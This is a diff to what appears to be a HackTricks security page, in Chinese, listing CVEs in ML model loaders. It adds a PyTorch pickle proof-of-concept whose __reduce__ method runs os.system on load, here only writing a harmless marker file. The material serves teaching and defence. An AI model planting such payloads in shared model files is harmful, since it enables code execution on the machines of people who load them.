@@ -21,8 +21,45 @@
 | **NVIDIA Triton Server**    | **CVE-2023-31036** (路径遍历)                                                                                          | 使用启用 `--model-control` 的模型加载 API 允许相对路径遍历以写入文件（例如，覆盖 `.bashrc` 以实现 RCE）                               | |
 | **GGML (GGUF 格式)**      | **CVE-2024-25664 … 25668** (多个堆溢出)                                                                         | 格式错误的 GGUF 模型文件导致解析器中的堆缓冲区溢出，使得在受害者系统上执行任意代码                                                      | |
 | **Keras (旧格式)**   | *(无新 CVE)* 旧版 Keras H5 模型                                                                                         | 恶意 HDF5 (`.h5`) 模型中的 Lambda 层代码在加载时仍然执行（Keras 安全模式不覆盖旧格式 – “降级攻击”）                                     | |
-| **其他** (一般)        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如，基于 pickle 的模型格式，Python `pickle.load`）将执行嵌入模型文件中的任意代码，除非采取缓解措施                     | |
+| **其他** (一般)        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如，基于 pickle 的模型格式，Python `pickle.load`）将在未缓解的情况下执行嵌入模型文件中的任意代码                     | |
 
 此外，还有一些基于 Python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果不使用 `weights_only=True` 加载，则可能会在系统上执行任意代码。因此，任何基于 pickle 的模型可能特别容易受到此类攻击，即使它们未在上表中列出。
 
+示例：
+
+- 创建模型：
+```python
+# attacker_payload.py
+import torch
+import os
+
+class MaliciousPayload:
+def __reduce__(self):
+# This code will be executed when unpickled (e.g., on model.load_state_dict)
+return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))
+
+# Create a fake model state dict with malicious content
+malicious_state = {"fc.weight": MaliciousPayload()}
+
+# Save the malicious state dict
+torch.save(malicious_state, "malicious_state.pth")
+```
+- 加载模型：
+```python
+# victim_load.py
+import torch
+import torch.nn as nn
+
+class MyModel(nn.Module):
+def __init__(self):
+super().__init__()
+self.fc = nn.Linear(10, 1)
+
+model = MyModel()
+
+# ⚠️ This will trigger code execution from pickle inside the .pth file
+model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
+
+# /tmp/pwned.txt is created even if you get an error
+```
 {{#include ../banners/hacktricks-training.md}}
